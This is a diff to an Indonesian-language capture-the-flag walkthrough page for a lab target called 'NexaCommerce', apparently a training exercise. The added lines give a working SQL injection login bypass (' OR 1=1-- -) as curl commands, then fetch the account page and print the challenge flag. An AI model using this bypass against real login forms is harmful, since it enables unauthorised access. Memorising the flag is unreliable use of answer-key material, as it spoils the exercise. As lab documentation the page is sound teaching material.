@@ -1,24 +1,25 @@
-# NexaCommerce — Flag & Verifikasi
+# NexaCommerce — Cara mendapatkan flag
 
 [← Overview](67-nexacommerce.md) · [Index](index.md)
 
-> **Langkah 2/5 — Cara Mendapatkan Flag.** Cara Mendapatkan Flag
->
-> **Titik penting:** NFX{sql1_un10n_bas3d_4uth_byp4ss}
+> **Langkah 2/5.** Login bypass `' OR 1=1-- -`. Flag ada di halaman `/account`.
 >
 > **Berikutnya:** [Flag](67-nexacommerce-03-flag.md)
 
-> **Flag:** `NFX{sql1_un10n_bas3d_4uth_byp4ss}`
-> **Status:** `VERIFIED`
+```bash
+curl -sS -i -c cookies -H 'ngrok-skip-browser-warning: 1' \
+  -d "email=' OR 1=1-- -&password=x" \
+  "$HOST/login"
+```
 
-1. Cek form login dan parameter yang masuk ke query.
-2. Uji injeksi dengan `' OR 1=1-- -`, lalu sesuaikan jumlah kolom untuk UNION.
-3. Setelah session admin, buka halaman admin dan ambil flag.
+Response: `302` ke `/account` dan `Set-Cookie: session=...`.
 
-### Terminal evidence (real)
+```bash
+curl -sS -b cookies -H 'ngrok-skip-browser-warning: 1' "$HOST/account" | grep -i flag
+```
 
-![Terminal evidence (real)](assets/nexacommerce/00b-terminal-evidence.png)
+```text
+flag for the audit console: NFX{sql1_un10n_bas3d_4uth_byp4ss}
+```
 
-*Terminal evidence (real).*
-
-> **Bukti:** terminal evidence (real).
+Nama flag menyebut UNION, tetapi payload yang diterima server adalah `' OR 1=1-- -`. Jangan menggantinya dengan UNION kalau bypass ini sudah cukup.
